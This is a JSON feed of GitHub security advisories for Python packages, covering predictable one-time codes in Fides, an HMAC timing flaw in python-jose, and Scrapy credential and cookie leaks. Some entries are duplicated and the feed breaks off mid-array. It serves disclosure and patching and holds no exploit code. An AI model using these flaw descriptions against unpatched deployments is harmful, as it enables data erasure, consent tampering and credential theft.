{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Fides Privacy Center allows data subject users to submit privacy and consent requests to data controller users of the Fides web application.</p>\n<p>Privacy requests allow data subjects to submit a request to access all person data held by the data controller, or delete/erase it.  Consent request allows data subject users to modify their privacy preferences for how the data controller uses their personal data e.g. data sales and sharing consent opt-in/opt-out.</p>\n<p>If <code>subject_identity_verification_required</code> in the <code>[execution]</code> section of <code>fides.toml</code> or the env var <code>FIDES__EXECUTION__SUBJECT_IDENTITY_VERIFICATION_REQUIRED</code> is set to <code>True</code> on the fides webserver backend, data subjects are sent a one-time code to their email address or phone number, depending on messaging configuration, and the one-time code must be entered in the Privacy Center UI by the data subject before the privacy or consent request is submitted.</p>\n<p>It was identified that the one-time code values for these requests were generated by the python <code>random</code> module, a cryptographically weak pseduo-random number generator (PNRG). If an attacker generates several hundred consecutive one-time codes, this vulnerability allows the attacker to predict all future one-time code values during the lifetime of the backend python process.</p>\n<p>There is no security impact on data access requests as the personal data download package is not shared in the Privacy Center itself. However, this vulnerability allows an attacker to (i) submit a verified data erasure request, resulting in deletion of data for the targeted user and (ii) submit a verified consent request, modifying a user's privacy preferences.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in Fides version <code>2.24.0</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://peps.python.org/pep-0506/\">https://peps.python.org/pep-0506/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ethyca/fides/security/advisories/GHSA-82vr-5769-6358\">https://github.com/ethyca/fides/security/advisories/GHSA-82vr-5769-6358</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48224\">https://nvd.nist.gov/vuln/detail/CVE-2023-48224</a></li>\n<li><a href=\"https://github.com/ethyca/fides/commit/685bae61c203d29ed189f4b066a5223a9bb774c6\">https://github.com/ethyca/fides/commit/685bae61c203d29ed189f4b066a5223a9bb774c6</a></li>\n<li><a href=\"https://peps.python.org/pep-0506/\">https://peps.python.org/pep-0506/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82vr-5769-6358\">https://github.com/advisories/GHSA-82vr-5769-6358</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82vr-5769-6358",
            "title": "[ethyca-fides] Ethyca Fides Cryptographically Weak Generation of One-Time Codes for Identity Verification",
            "date_modified": "2023-11-16T14:33:07.000Z",
            "date_published": "2023-11-16T14:33:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82vr-5769-6358"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>python-jose before 1.3.2 allows attackers to have unspecified impact by leveraging failure to use a constant time comparison for HMAC keys.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-7036\">https://nvd.nist.gov/vuln/detail/CVE-2016-7036</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/releases/tag/1.3.2\">https://github.com/mpdavis/python-jose/releases/tag/1.3.2</a></li>\n<li><a href=\"https://web.archive.org/web/20210123221523/http://www.securityfocus.com/bid/95845\">https://web.archive.org/web/20210123221523/http://www.securityfocus.com/bid/95845</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/commit/73007d6887a7517ac07c6e755e494baee49ef513\">https://github.com/mpdavis/python-jose/commit/73007d6887a7517ac07c6e755e494baee49ef513</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w799-prg3-cx77\">https://github.com/advisories/GHSA-w799-prg3-cx77</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w799-prg3-cx77",
            "title": "[python-jose] python-jose failure to use a constant time comparison for HMAC keys",
            "date_modified": "2023-11-16T05:04:43.000Z",
            "date_published": "2022-05-17T03:02:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w799-prg3-cx77"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When the <a href=\"https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy\">built-in HTTP proxy downloader middleware</a> processes a request with <code>proxy</code> metadata, and that <code>proxy</code> metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the <code>Proxy-Authentication</code> header, but only if that header is not already set.</p>\n<p>There are third-party proxy-rotation downloader middlewares that set different <code>proxy</code> metadata every time they process a request.</p>\n<p>Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.</p>\n<p>These third-party proxy-rotation downloader middlewares could change the <code>proxy</code> metadata of a request to a new value, but fail to remove the <code>Proxy-Authentication</code> header from the previous value of the <code>proxy</code> metadata, causing the credentials of one proxy to be leaked to a different proxy.</p>\n<p>If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under <strong>Workarounds</strong> below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.2.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, make sure that any code that changes the value of the <code>proxy</code> request meta also removes the <code>Proxy-Authorization</code> header from the request if present.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f\">https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3",
            "title": "[scrapy] Scrapy before 2.6.2 and 1.8.3 vulnerable to one proxy sending credentials to another",
            "date_modified": "2023-11-15T18:31:23.000Z",
            "date_published": "2022-07-29T22:26:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When the <a href=\"https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy\">built-in HTTP proxy downloader middleware</a> processes a request with <code>proxy</code> metadata, and that <code>proxy</code> metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the <code>Proxy-Authentication</code> header, but only if that header is not already set.</p>\n<p>There are third-party proxy-rotation downloader middlewares that set different <code>proxy</code> metadata every time they process a request.</p>\n<p>Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.</p>\n<p>These third-party proxy-rotation downloader middlewares could change the <code>proxy</code> metadata of a request to a new value, but fail to remove the <code>Proxy-Authentication</code> header from the previous value of the <code>proxy</code> metadata, causing the credentials of one proxy to be leaked to a different proxy.</p>\n<p>If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under <strong>Workarounds</strong> below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.2.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, make sure that any code that changes the value of the <code>proxy</code> request meta also removes the <code>Proxy-Authorization</code> header from the request if present.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f\">https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x8m-2xpf-crp3\">https://github.com/advisories/GHSA-9x8m-2xpf-crp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3",
            "title": "[scrapy] Scrapy before 2.6.2 and 1.8.3 vulnerable to one proxy sending credentials to another",
            "date_modified": "2023-11-15T18:31:23.000Z",
            "date_published": "2022-07-29T22:26:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x8m-2xpf-crp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from <code>example.co.uk</code>, given its public domain name suffix is <code>co.uk</code>) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the <a href=\"https://publicsuffix.org/\">public suffix list</a>.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only workaround for unpatched versions of Scrapy is to <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://publicsuffix.org/\">https://publicsuffix.org/</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a\">https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/advisories/GHSA-mfjm-vh54-3f96</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96",
            "title": "[scrapy] Scrapy cookie-setting is not restricted based on the public suffix list",
            "date_modified": "2023-11-15T18:30:38.000Z",
            "date_published": "2022-03-01T22:13:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from <code>example.co.uk</code>, given its public domain name suffix is <code>co.uk</code>) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the <a href=\"https://publicsuffix.org/\">public suffix list</a>.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only workaround for unpatched versions of Scrapy is to <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://publicsuffix.org/\">https://publicsuffix.org/</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a\">https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mfjm-vh54-3f96\">https://github.com/advisories/GHSA-mfjm-vh54-3f96</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96",
            "title": "[scrapy] Scrapy cookie-setting is not restricted based on the public suffix list",
            "date_modified": "2023-11-15T18:30:38.000Z",
            "date_published": "2022-03-01T22:13:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mfjm-vh54-3f96"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If you manually define cookies on a <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code></a> object, and that <code>Request</code> object gets a redirect response, the new <code>Request</code> object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which resets cookies when creating <code>Request</code> objects to follow redirects¹, and drops the <code>Cookie</code> header if manually-defined if the redirect target URL domain name does not match the source URL domain name².</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<p>¹ At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.</p>\n<p>² This prevents cookie leaks to unintended domains even if the cookies middleware is not used.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code> documentation</a>, and set the right domain for each cookie.</p>\n<p>Alternatively, you can <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to domains that you trust with all your user-set cookies.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Originally reported at <a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/\">huntr.dev</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a\">https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0577\">https://nvd.nist.gov/vuln/detail/CVE-2022-0577</a></li>\n<li><a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585\">https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8",
            "title": "[scrapy] Incorrect Authorization and Exposure of Sensitive Information to an Unauthorized Actor in scrapy",
            "date_modified": "2023-11-15T18:29:54.000Z",
            "date_published": "2022-03-01T22:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If you manually define cookies on a <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code></a> object, and that <code>Request</code> object gets a redirect response, the new <code>Request</code> object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.6.0, which resets cookies when creating <code>Request</code> objects to follow redirects¹, and drops the <code>Cookie</code> header if manually-defined if the redirect target URL domain name does not match the source URL domain name².</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>\n<p>¹ At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.</p>\n<p>² This prevents cookie leaks to unintended domains even if the cookies middleware is not used.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the <a href=\"https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request\"><code>Request</code> documentation</a>, and set the right domain for each cookie.</p>\n<p>Alternatively, you can <a href=\"https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED\">disable cookies altogether</a>, or <a href=\"https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains\">limit target domains</a> to domains that you trust with all your user-set cookies.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Originally reported at <a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/\">huntr.dev</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a\">https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0577\">https://nvd.nist.gov/vuln/detail/CVE-2022-0577</a></li>\n<li><a href=\"https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585\">https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjvr-mfj7-j4j8\">https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8",
            "title": "[scrapy] Incorrect Authorization and Exposure of Sensitive Information to an Unauthorized Actor in scrapy",
            "date_modified": "2023-11-15T18:29:54.000Z",
            "date_published": "2022-03-01T22:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjvr-mfj7-j4j8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If you use <a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\"><code>HttpAuthMiddleware</code></a> (i.e. the <code>http_user</code> and <code>http_pass</code> spider attributes) for HTTP authentication, all requests will expose your credentials to the request target.</p>\n<p>This includes requests generated by Scrapy components, such as <code>robots.txt</code> requests sent by Scrapy when the <code>ROBOTSTXT_OBEY</code> setting is set to <code>True</code>, or as requests reached through redirects.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.5.1 and use the new <code>http_auth_domain</code> spider attribute to control which domains are allowed to receive the configured HTTP authentication credentials.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.5.1 is not an option, you may upgrade to Scrapy 1.8.1 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, set your HTTP authentication credentials on a per-request basis, using for example the <a href=\"https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header\"><code>w3lib.http.basic_auth_header</code></a> function to convert your credentials into a value that you can assign to the <code>Authorization</code> header of your request, instead of defining your credentials globally using <a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\"><code>HttpAuthMiddleware</code></a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498\">https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6\">https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6</a></li>\n<li><a href=\"https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header\">https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header</a></li>\n<li><a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\">http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41125\">https://nvd.nist.gov/vuln/detail/CVE-2021-41125</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwqp-28gf-p498\">https://github.com/advisories/GHSA-jwqp-28gf-p498</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwqp-28gf-p498",
            "title": "[Scrapy] Scrapy HTTP authentication credentials potentially leaked to target websites ",
            "date_modified": "2023-11-15T18:27:38.000Z",
            "date_published": "2021-10-06T17:46:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwqp-28gf-p498"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If you use <a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\"><code>HttpAuthMiddleware</code></a> (i.e. the <code>http_user</code> and <code>http_pass</code> spider attributes) for HTTP authentication, all requests will expose your credentials to the request target.</p>\n<p>This includes requests generated by Scrapy components, such as <code>robots.txt</code> requests sent by Scrapy when the <code>ROBOTSTXT_OBEY</code> setting is set to <code>True</code>, or as requests reached through redirects.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to Scrapy 2.5.1 and use the new <code>http_auth_domain</code> spider attribute to control which domains are allowed to receive the configured HTTP authentication credentials.</p>\n<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.5.1 is not an option, you may upgrade to Scrapy 1.8.1 instead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade, set your HTTP authentication credentials on a per-request basis, using for example the <a href=\"https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header\"><code>w3lib.http.basic_auth_header</code></a> function to convert your credentials into a value that you can assign to the <code>Authorization</code> header of your request, instead of defining your credentials globally using <a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\"><code>HttpAuthMiddleware</code></a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/issues\">Open an issue</a></li>\n<li><a href=\"mailto:opensource@zyte.com\">Email us</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498\">https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6\">https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6</a></li>\n<li><a href=\"https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header\">https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header</a></li>\n<li><a href=\"http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth\">http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41125\">https://nvd.nist.gov/vuln/detail/CVE-2021-41125</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html\">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwqp-28gf-p498\">https://github.com/advisories/GHSA-jwqp-28gf-p498</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwqp-28gf-p498",
            "title": "[Scrapy] Scrapy HTTP authentication credentials potentially leaked to target websites ",
            "date_modified": "2023-11-15T18:27:38.000Z",
            "date_published": "2021-10-06T17:46:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwqp-28gf-p498"
            },
            "tags": [
                "severity"
            ]
        },
        {
